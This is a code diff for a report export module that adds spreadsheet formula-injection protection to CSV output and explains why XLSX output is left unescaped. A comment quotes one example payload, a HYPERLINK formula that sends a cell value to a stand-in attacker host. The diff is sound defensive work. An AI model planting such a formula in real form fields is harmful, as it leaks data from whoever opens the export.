@@ -9,14 +9,54 @@ import {
 } from '../../common/pdf.util';
 import type { ReportCell, ReportResult } from './reports.service';
 
+/**
+ * Leading characters that make a spreadsheet treat an imported CSV field as a
+ * FORMULA rather than text: the three formula sigils, Lotus-style '@', and the
+ * whitespace ones that are skipped before the sigil is read.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/**
+ * Defuse spreadsheet formula injection (CSV only — see reportToWorkbook).
+ *
+ * Report rows carry names, addresses and free text, and three of the fields
+ * feeding them are writable by ANYONE through the unauthenticated public
+ * intake forms (/api/public/referrals and friends). A referral submitted with
+ * a first name of `=HYPERLINK("https://attacker.example/"&A2,"Open")` sits in
+ * the queue looking like a name; the payload never runs server-side, and then
+ * executes in Excel on the staff laptop that opens the export.
+ *
+ * The leading apostrophe is the standard mitigation: it is consumed as a
+ * text-marker on import and the rest of the value is preserved. It is applied
+ * HERE, at the writer, rather than at intake — sanitising on the way in breaks
+ * legitimate names and only ever covers the fields someone remembered.
+ */
+export function csvSafeCell(value: ReportCell): ReportCell {
+  return typeof value === 'string' && FORMULA_LEAD.test(value) ? `'${value}` : value;
+}
+
 /** Rows are already flat primitives — rendering is a straight projection. */
 export function reportToCsv(result: ReportResult): string {
   return stringify(
-    result.rows.map((row) => result.columns.map((c) => row[c.key] ?? '')),
+    result.rows.map((row) => result.columns.map((c) => csvSafeCell(row[c.key] ?? ''))),
     { header: true, columns: result.columns.map((c) => c.label) },
   );
 }
 
+/**
+ * Deliberately NOT formula-escaped, unlike the CSV writer above.
+ *
+ * XLSX is a different format with a different threat: a formula is an explicit
+ * `<f>` element, and a plain string assigned through addRow is written as a
+ * shared string (`t="s"`), which Excel renders literally and never evaluates.
+ * Verified against this ExcelJS version by writing `=HYPERLINK(...)`, `+1`,
+ * `-1` and `@SUM(A1)` through it and reading xl/worksheets/sheet1.xml: every
+ * cell came out `t="s"` with zero `<f>` elements.
+ *
+ * So prefixing here would buy no safety and would corrupt real data — every
+ * note that happens to start with a dash would grow an apostrophe. If this
+ * ever moves off ExcelJS, re-run that check before trusting this comment.
+ */
 export function reportToWorkbook(result: ReportResult, sheetName: string): ExcelJS.Workbook {
   const workbook = new ExcelJS.Workbook();
   // Excel caps sheet names at 31 characters.
